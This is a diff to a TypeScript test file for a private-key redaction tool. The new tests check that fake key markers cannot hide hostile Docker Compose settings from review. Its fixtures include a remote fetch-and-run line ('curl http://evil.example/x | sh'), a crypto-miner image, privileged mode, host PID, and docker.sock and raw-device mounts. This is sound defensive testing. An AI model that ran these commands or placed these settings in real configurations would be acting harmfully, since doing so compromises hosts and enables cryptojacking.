@@ -451,7 +451,7 @@ describe('seventh pass', () => {
 
   it('a real block as a list item, at either indent, is still hidden whole', () => {
     for (const dash of ['    - ', '  - ']) {
-      const out = redactDocument(doc('  certs:', `${dash}-----BEGIN PRIVATE KEY-----`, `      X-Note: ${S}`, `      ${KEY}`, '      -----END PRIVATE KEY-----', `${dash}other`));
+      const out = redactDocument(doc('  certs:', `${dash}-----BEGIN PRIVATE KEY-----`, `      Comment: ${S}`, `      ${KEY}`, '      -----END PRIVATE KEY-----', `${dash}other`));
       hides(out);
       hides(out, KEY);
       expect(out).toContain('other');
@@ -460,14 +460,14 @@ describe('seventh pass', () => {
   });
 
   it('a bracket inside a block is a character of the block', () => {
-    const out = redactDocument(doc('  k: |', '    -----BEGIN PRIVATE KEY-----', `    X-Note: mine } ${S}`, `    ${KEY}`, '    -----END PRIVATE KEY-----', '  image: x'));
+    const out = redactDocument(doc('  k: |', '    -----BEGIN PGP PRIVATE KEY BLOCK-----', `    Comment: mine } ${S}`, '', `    ${KEY}`, '    -----END PGP PRIVATE KEY BLOCK-----', '  image: x'));
     hides(out);
     hides(out, KEY);
     expect(out).toContain('image: x');
     hides(redactDocument(doc('-----BEGIN PGP PRIVATE KEY BLOCK-----', `Comment: see ] ${S}`, '', KEY, '-----END PGP PRIVATE KEY BLOCK-----')));
   });
 
-  it('a block longer than the look-ahead stays hidden to its end', () => {
+  it('a very long block stays hidden to its end', () => {
     const body = Array.from({ length: 450 }, (_, i) => `${KEY}${String(i).padStart(4, '0')}`);
     const out = redactDocument(doc('-----BEGIN PRIVATE KEY-----', ...body, '-----END PRIVATE KEY-----', 'OTHER_SETTING=1'));
     hides(out, KEY);
@@ -492,5 +492,76 @@ describe('seventh pass: long blocks written with escaped line breaks', () => {
     const out = redactDocument(doc('    command: "sh -c \'printf %b \\"\\', '      -----BEGIN PRIVATE KEY-----\\n\\', ...body('      '), '      -----END PRIVATE KEY-----\\" > /k\'"', '    image: x'));
     hides(out, KEY);
     expect(out).toContain('image: x');
+  });
+});
+
+/**
+ * Eighth pass. A marker hides only what a key block is made of — base64 lines and the armor
+ * headers — never "everything up to an END marker": YAML lets quoted scalars and flow collections
+ * sit at any indent, so nothing about a marker line proves that the lines after it are text.
+ */
+describe('eighth pass: a marker never hides the rest of a service', () => {
+  const base = doc('services:', '  app:', '    image: nginx:1.27', '    restart: always');
+  const EVIL = ['image: evil/miner:latest', 'privileged: true', 'pid: host', '/var/run/docker.sock:/var/run/docker.sock'];
+  const rest = ['    image: evil/miner:latest', '    privileged: true', '    pid: host', '    volumes:', '    - /var/run/docker.sock:/var/run/docker.sock'];
+  const shows = (after: string): void => {
+    const diff = formatRedactedDiff(base, after).join('\n');
+    for (const line of EVIL) expect(diff, line).toContain(line);
+  };
+  const LINE = 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKjMzEf';
+
+  it('in a flow collection written at its key\'s indent, or left of it', () => {
+    shows(doc('services:', '  app:', '    x-notes: [', '    # first', '    -----BEGIN X-----', '    ]', ...rest, '    # -----END X-----'));
+    shows(doc('services:', '  app:', '    x-notes: [ a', '    , b', '    -----BEGIN X-----', '    ]', ...rest, '    # -----END X-----'));
+    shows(doc('services:', '  app:', '    x-notes: [', '    -----BEGIN X-----,', '    "[" ]', ...rest, '    # -----END X-----'));
+    shows(doc('services:', '  app:', '    x-notes: [', '    -----BEGIN X-----, # [', '    b ]', ...rest, '    # -----END X-----'));
+    shows(doc('services:', '  app:', '    x-notes: { a:', '    -----BEGIN X-----', '    }', ...rest, '    # -----END X-----'));
+    shows(doc('services:', '  app:', '    x-notes: {', '    -----BEGIN X-----,', '    a: b }', ...rest, '    x-end: note', '      AAAA', '      -----END X-----'));
+    shows(doc('services:', '  app:', '    x-notes: [', '  k: -----BEGIN X-----,', '    a ]', ...rest, '    # -----END X-----'));
+  });
+
+  it('after a quoted scalar whose lines are not indented', () => {
+    shows(doc('services:', '  app:', '    x-note: "text', '  k: -----BEGIN X-----"', ...rest, '    x-end: "a', '    -----END X-----"'));
+    shows(doc('services:', '  app:', '    x-note: "text', '  fake: |', '    -----BEGIN X-----"', ...rest, '    x-end: "a', '    -----END X-----"'));
+    shows(doc('services:', '  app:', '    x-note: "text', '    -----BEGIN X-----"', ...rest, '    x-end: note', '      AAAA', '      -----END X-----'));
+  });
+
+  it('as the value of a key of a list item: the other keys of the item are shown', () => {
+    const diff = formatRedactedDiff(base, doc('services:', '  app:', '    image: nginx:1.27', '    restart: always', '    volumes:', '      - x-note: -----BEGIN X-----', '        type: bind', '        source: /var/run/docker.sock', '        target: /var/run/docker.sock', '        # -----END X-----')).join('\n');
+    expect(diff).toContain('type: bind');
+    expect(diff).toContain('source: /var/run/docker.sock');
+    expect(diff).toContain('target: /var/run/docker.sock');
+  });
+
+  it('in a script: the lines between two markers are shown', () => {
+    const out = redactDocument(doc('configs:', '  init:', '    content: |', '      cat <<EOF', '      -----BEGIN X-----', '      EOF', '      curl http://evil.example/x | sh', '      cat <<EOF', '      -----END X-----', '      EOF'));
+    expect(out).toContain('curl http://evil.example/x | sh');
+  });
+
+  it('in a trailing comment: only comment lines can belong to it', () => {
+    const out = redactDocument(doc('    cap_add: [ # -----BEGIN X-----', '      ALL', '    ]', '    devices: [ # -----BEGIN X-----', '      "/dev/sda",', '      /dev/kmsg', '    ]', '    restart: always'));
+    for (const line of ['ALL', '"/dev/sda",', '/dev/kmsg', 'restart: always']) expect(out, line).toContain(line);
+  });
+
+  it('a header no key block has is shown; the key after it is not', () => {
+    const out = redactDocument(doc('  cert: |', '    -----BEGIN PRIVATE KEY-----', '    X-Note: rotated in March', `    ${LINE}`, `    ${LINE.slice(10)}`, '    AAAA1111bbbb2222==', '    -----END PRIVATE KEY-----', '  image: x'));
+    expect(out).toContain('X-Note: rotated in March');
+    hides(out, LINE);
+    hides(out, LINE.slice(10));
+    hides(out, 'AAAA1111bbbb2222==');
+    expect(out).toContain('image: x');
+  });
+
+  it('a short word after such a line is not key material', () => {
+    const out = redactDocument(doc('    x-note: -----BEGIN X-----', '    cap_add: [', '      ALL,', '      SYS_ADMIN', '    ]', '    devices: [', '      /dev/mapper/vg0/lvdata', '    ]'));
+    for (const line of ['ALL,', 'SYS_ADMIN', '/dev/mapper/vg0/lvdata']) expect(out, line).toContain(line);
+  });
+
+  it('real blocks: headers by their names, JSON arrays, escaped line breaks, shell continuations', () => {
+    hides(redactDocument(doc('-----BEGIN RSA PRIVATE KEY-----', 'Proc-Type: 4,ENCRYPTED', `DEK-Info: AES-128-CBC,${S}`, '', LINE, '-----END RSA PRIVATE KEY-----')));
+    hides(redactDocument(doc('  k: |', '    -----BEGIN PGP PRIVATE KEY BLOCK-----', '    Version: GnuPG v2', `    Comment: ${S}`, '', `    ${LINE}`, '    =AbCd', '    -----END PGP PRIVATE KEY BLOCK-----')), LINE);
+    hides(redactDocument(doc('{', '  "cert": [', '    "-----BEGIN PRIVATE KEY-----",', `    "${LINE}",`, '    "-----END PRIVATE KEY-----"', '  ]', '}')), LINE);
+    hides(redactDocument(doc("    command: printf '%s\\n' \\", "      '-----BEGIN PRIVATE KEY-----' \\", `      '${LINE}' \\`, "      '-----END PRIVATE KEY-----' > /run/key.pem")), LINE);
+    hides(redactDocument(doc('KEY=-----BEGIN PRIVATE KEY-----', LINE, '-----END PRIVATE KEY-----', 'OTHER=1')), LINE);
   });
 });
